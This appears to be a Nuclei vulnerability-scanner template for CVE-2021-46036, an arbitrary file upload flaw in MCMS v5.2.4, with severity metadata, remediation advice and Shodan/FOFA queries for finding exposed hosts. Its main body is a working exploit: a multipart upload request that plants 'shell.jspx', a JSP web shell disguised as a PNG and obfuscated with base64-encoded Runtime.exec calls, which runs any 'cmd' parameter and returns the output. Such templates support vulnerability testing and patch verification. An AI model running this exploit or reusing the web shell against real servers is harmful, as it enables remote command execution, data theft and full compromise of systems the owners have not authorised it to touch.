id: CVE-2021-46036

info:
  name: MCMS v5.2.4 Arbitrary File Upload to RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: An arbitrary file upload vulnerability in the component /ms/file/uploadTemplate.do of MCMS v5.2.4 allows attackers to execute arbitrary code.
  impact: |
    Successful exploitation could result in unauthorized access, data theft, and full system compromise.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the vulnerability.
  reference:
    - https://lycshub.github.io/2021/12/28/MCMS-vulnerabilities/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-46036
    cwe-id: CWE-434
    epss-score: 0.00586
    epss-percentile: 0.78836
    cpe: cpe:2.3:a:mingsoft:mcms:5.2.4:*:*:*:*:*:*:*
  metadata:
    vendor: mingsoft
    product: mcms
    shodan-query: http.favicon.hash:1464851260
    fofa-query: icon_hash="1464851260"
  tags: intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/file/upload.do"

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------124088951720288539841514905041

    body: |
      -----------------------------124088951720288539841514905041
      Content-Disposition: form-data; name="uploadPath"
      /
      -----------------------------124088951720288539841514905041
      Content-Disposition: form-data; name="isRename"
      false
      -----------------------------124088951720288539841514905041
      Content-Disposition: form-data; name="appId"
      false
      -----------------------------124088951720288539841514905041
      Content-Disposition: form-data; name="file"; filename="shell.jspx"
      Content-Type: image/png
      <%@ page contentType="text/html;charset=UTF-8" language="java" %>
      <%@ page import="sun.misc.BASE64Decoder" %>
      <%
      if(request.getParameter("cmd")!=null){
      BASE64Decoder decoder = new BASE64Decoder();
      Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
      Process e = (Process)
      rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
      String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
      Object[]{}), request.getParameter("cmd") );
      java.io.InputStream in = e.getInputStream();
      int a = -1;
      byte[] b = new byte[2048];
      out.print("<pre>");
      while((a=in.read(b))!=-1){
      out.println(new String(b));
      }
      out.print("</pre>");
      }
      %>
      -----------------------------124088951720288539841514905041--
    matchers:
      - type: word
        words:
          - "<pre>"
        part: body
